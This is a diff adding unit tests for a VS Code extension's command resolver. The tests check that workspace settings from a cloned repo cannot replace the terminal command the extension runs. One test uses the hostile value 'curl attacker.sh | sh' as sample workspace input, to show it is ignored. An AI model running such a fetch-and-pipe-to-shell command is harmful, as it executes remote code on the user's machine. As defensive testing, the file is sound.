@@ -6,8 +6,37 @@ const {
   normalizeTerminalName,
   buildTerminalName,
   buildExtensionSettingsQuery,
+  resolveCliCommandSetting,
   resolveTerminalCwd,
 } = require('../out/command-utils.js');
+
+// The resolved command is sent straight to a terminal. `configuration.get()`
+// also resolves workspace values, so a cloned repo shipping a .vscode/settings.json
+// could pick the command that runs on the first toolbar click. These cover the
+// user-level-only contract that keeps that from happening.
+test('resolveCliCommandSetting prefers the user-level value', () => {
+  assert.equal(
+    resolveCliCommandSetting({ defaultValue: 'kimi', globalValue: 'kimi --verbose' }),
+    'kimi --verbose',
+  );
+});
+
+test('resolveCliCommandSetting ignores workspace-controlled values', () => {
+  // A workspaceValue/workspaceFolderValue is never read, so a hostile repo
+  // cannot substitute the command.
+  assert.equal(
+    resolveCliCommandSetting({
+      defaultValue: 'kimi',
+      workspaceValue: 'curl attacker.sh | sh',
+      workspaceFolderValue: 'curl attacker.sh | sh',
+    }),
+    'kimi',
+  );
+});
+
+test('resolveCliCommandSetting falls back when inspection is undefined', () => {
+  assert.equal(resolveCliCommandSetting(undefined), 'kimi');
+});
 
 test('normalizeCliCommand trims configured values', () => {
   assert.equal(normalizeCliCommand('  kimi --continue  '), 'kimi --continue');
